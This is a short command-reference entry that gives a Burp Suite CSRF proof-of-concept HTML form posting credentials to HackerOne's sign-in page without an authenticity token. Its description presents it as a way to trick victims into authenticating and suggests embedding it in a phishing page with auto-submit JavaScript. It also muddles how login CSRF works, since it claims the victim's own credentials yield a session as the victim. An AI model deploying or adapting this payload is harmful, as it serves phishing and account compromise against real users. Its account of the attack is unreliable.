# hackerone-csrf-poc-submit

## Command

```html
<html><!--CSRF PoC - generated by Burp Suite Professional --><body><script>history.pushState('','','/')</script><form action="https://hackerone.com/users/sign_in" method="POST"><input type="hidden" name="user[email]" value="youremail"/><input type="hidden" name="user[password]" value="yourpassword"/><input type="hidden" name="user[remember_me]" value="1"/><input type="submit" value="Submit request"/></form></body></html>
```

## Description

HTML form that submits login credentials to HackerOne without the authenticity_token, demonstrating CSRF bypass. Use to trick victims into authenticating.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| user[email] | Victim's email address | Yes |
| user[password] | Victim's password | Yes |
| user[remember_me] | 1 to persist session | No |

## Examples

### Basic Usage

Replace placeholders and host as HTML file:

```html
<input type="hidden" name="user[email]" value="victim@example.com"/>
```

### Advanced Usage

Embed in phishing page with auto-submit JavaScript.

## Expected Output

Successful login response, HTTP 302 redirect to dashboard as the victim.
